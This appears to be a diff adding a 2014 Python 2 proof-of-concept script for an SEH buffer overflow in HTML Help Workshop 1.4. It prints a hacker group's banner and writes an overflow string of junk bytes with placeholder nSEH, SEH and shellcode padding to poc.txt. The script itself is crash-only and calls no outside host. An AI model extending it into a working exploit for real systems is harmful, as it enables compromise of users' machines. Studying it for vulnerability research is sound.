@@ -1,0 +1,46 @@
+#----------------------------------------------------------------------------------------------------#
+# Exploit Title: HTML Help Workshop - (SEH) Buffer Overflow                                          #
+# Date: August 24 2014                                                                               #
+# Exploit Author: Moroccan Kingdom (MKD)                                                             #
+# Software Link: http://msdn.microsoft.com/en-us/library/windows/desktop/ms669985%28v=vs.85%29.aspx  #                                     #
+# Version: 1.4                                                                                       #
+# Tested on: Windows XP SP3/SP2 | Windows 7 64/32-bit  (eng)                                         #
+#----------------------------------------------------------------------------------------------------#
+
+import subprocess,time
+import sys,os
+
+if os.name == "nt" :
+   subprocess.call('cls', shell=True)
+   os.system("color c")
+else :
+   subprocess.call('clear', shell=True)
+
+time.sleep(1)
+
+print '''
+///////////////////////////////////////////////////////////////////////////////
+/                               M.O.R.O.C.C.A.N                               /
+/                                K.I.N.G.D.O.M                                /
+/                                    [MKD]                                    /
+/ CONTACT US : facebook.com/moroccankingdom024 | twitter.com/moroccankingdom  /
+/ To run this exploit Go to DOS and then go to the folder path program and    /
+/ run this command : hc | exm : hcc.exe AAAABBBCCCSSS...           /
+/////////////////////////////////////////////////////////////////////////////// '''
+
+JNK = "A" * 284
+NEH = "B" * 4                   
+SEH = "C" * 4                
+SHL = "S" * 400
+
+POC = JNK + NEH + SEH + SHL
+
+try :
+   file = open("poc.txt", "w")
+   file.write(POC)
+   file.close()
+   print "\n[*] file created successfully"
+except:
+   print "[#] error to create file"
+ 
+close = raw_input("\n[!] press any button to close()")
